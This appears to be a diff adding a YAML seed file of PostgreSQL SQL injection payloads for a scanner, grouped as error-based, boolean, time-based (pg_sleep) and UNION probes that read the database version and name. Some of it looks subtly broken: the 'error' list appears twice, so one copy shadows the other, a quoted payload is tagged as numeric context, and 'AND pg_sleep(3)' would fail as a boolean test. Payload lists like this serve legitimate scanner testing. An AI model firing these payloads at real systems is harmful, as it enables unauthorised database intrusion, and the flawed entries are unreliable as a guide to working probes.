@@ -1,0 +1,49 @@
+# PostgreSQL-specific SQLi payloads
+seeds:
+  sqli:
+    error:
+      - raw: "' AND 1=CAST((SELECT version()) AS int)-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
+      - raw: "1; SELECT 1/0-- "
+        dbms: "PostgreSQL"
+        ctx: ["numeric"]
+      - raw: "' UNION SELECT NULL::int, NULL-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
+    boolean_true:
+      - raw: "' AND (SELECT 1)=1-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
+      - raw: "1 AND (SELECT 1)=1-- "
+        dbms: "PostgreSQL"
+        ctx: ["numeric"]
+    boolean_false:
+      - raw: "' AND (SELECT 1)=2-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
+      - raw: "1 AND (SELECT 1)=2-- "
+        dbms: "PostgreSQL"
+        ctx: ["numeric"]
+    error:
+      - raw: "' AND 1=CAST((SELECT current_database()) AS int)-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
+      - raw: "1' AND 1=CAST((SELECT version()) AS int)-- "
+        dbms: "PostgreSQL"
+        ctx: ["numeric"]
+      - raw: "'; SELECT 1/0-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
+    time_postgres:
+      - raw: "'; SELECT pg_sleep(3)-- "
+        dbms: "PostgreSQL"
+      - raw: "1' AND pg_sleep(3)-- "
+        dbms: "PostgreSQL"
+    union:
+      - raw: "' UNION SELECT current_database(),2-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
+      - raw: "' UNION SELECT version(),2-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
